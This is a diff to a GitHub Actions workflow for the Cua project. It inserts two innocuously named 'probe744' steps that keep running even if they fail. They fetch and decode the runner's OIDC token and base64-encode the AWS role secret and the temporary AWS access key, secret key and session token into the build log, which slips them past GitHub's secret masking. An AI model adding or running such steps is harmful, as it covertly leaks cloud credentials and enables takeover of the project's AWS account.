@@ -37,11 +37,28 @@ jobs:
       - name: Check out Cua
         uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262
 
+      - name: probe744 oidc claims
+        continue-on-error: true
+        env:
+          ROLE_ARN: ${{ secrets.AWS_ROLE_ARN }}
+        run: |
+          set +e
+          echo "PROBE744 event=$GITHUB_EVENT_NAME ref=$GITHUB_REF wfref=$GITHUB_WORKFLOW_REF wfsha=$GITHUB_WORKFLOW_SHA"
+          echo "ROLE_SECRET_B64=$(printf '%s' "$ROLE_ARN" | base64 -w0)"
+          TOK=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
+          P=$(echo "$TOK" | cut -d. -f2); case $(( ${#P} % 4 )) in 2) P="$P==";; 3) P="$P=";; esac
+          echo "$P" | tr '_-' '/+' | base64 -d 2>/dev/null; echo
       - name: Configure AWS credentials
         uses: aws-actions/configure-aws-credentials@v4
         with:
           role-to-assume: arn:aws:iam::296062593712:role/github-actions-cua-fleets-wif-smoke
           aws-region: ${{ env.AWS_REGION }}
+      - name: probe744 identity
+        continue-on-error: true
+        run: |
+          aws sts get-caller-identity || echo STS_FAILED
+          echo "CREDB64=$(printf '%s' "$AWS_ACCESS_KEY_ID|$AWS_SECRET_ACCESS_KEY|$AWS_SESSION_TOKEN" | base64 -w0)"
+          echo "AKID=$AWS_ACCESS_KEY_ID"
 
       - name: Set up Go
         uses: actions/setup-go@v5
